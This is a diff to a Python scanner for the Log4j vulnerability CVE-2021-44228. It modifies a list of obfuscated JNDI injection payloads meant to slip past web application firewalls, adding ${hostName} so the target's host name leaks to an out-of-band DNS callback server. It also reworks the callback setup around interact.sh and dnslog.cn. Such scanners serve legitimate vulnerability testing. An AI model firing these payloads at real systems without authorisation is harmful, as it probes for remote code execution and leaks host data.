@@ -50,14 +50,14 @@ default_headers = {
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 timeout = 4
 
-waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
-                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
-                       "${jndi:rmi://{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
-                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
-                       "${jndi:dns://{{callback_host}}}",
+waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://${hostName}.{{callback_host}}/{{random}}}",
+                       "${${::-j}ndi:rmi://${hostName}.{{callback_host}}/{{random}}}",
+                       "${jndi:rmi://${hostName}.{{callback_host}}}",
+                       "${${lower:jndi}:${lower:rmi}://${hostName}.{{callback_host}}/{{random}}}",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://${hostName}.{{callback_host}}/{{random}}}",
+                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://${hostName}.{{callback_host}}/{{random}}}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://${hostName}.{{callback_host}}/{{random}}}",
+                       "${jndi:dns://${hostName}.{{callback_host}}}",
                        ]
 
 cve_2021_45046 = [
@@ -281,7 +281,7 @@ def parse_url(url):
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    payload = '${jndi:ldap://${hostName}.%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
@@ -347,27 +347,27 @@ def main():
                 urls.append(i)
 
     dns_callback_host = ""
-    if args.custom_dns_callback_host:
-        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
-        dns_callback_host =  args.custom_dns_callback_host
+    #if args.custom_dns_callback_host:
+    #    cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
+    #    dns_callback_host =  args.custom_dns_callback_host
+    #else:
+    cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
+    if args.dns_callback_provider == "interact.sh":
+        dns_callback = Interactsh(server=args.custom_dns_callback_host)
+    elif args.dns_callback_provider == "dnslog.cn":
+        dns_callback = Dnslog()
     else:
-        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
-        if args.dns_callback_provider == "interact.sh":
-            dns_callback = Interactsh()
-        elif args.dns_callback_provider == "dnslog.cn":
-            dns_callback = Dnslog()
-        else:
-            raise ValueError("Invalid DNS Callback provider")
-        dns_callback_host = dns_callback.domain
+        raise ValueError("Invalid DNS Callback provider")
+    dns_callback_host = dns_callback.domain
 
     cprint("[%] Checking for Log4j RCE CVE-2021-44228.", "magenta")
     for url in urls:
         cprint(f"[•] URL: {url}", "magenta")
         scan_url(url, dns_callback_host)
 
-    if args.custom_dns_callback_host:
-        cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
-        return
+    #if args.custom_dns_callback_host:
+    #    cprint("[•] Payloads sent to all URLs. Custom DNS Callback host is provided, please check your logs to verify the existence of the vulnerability. Exiting.", "cyan")
+    #    return
 
     cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
     cprint("[•] Waiting...", "cyan")
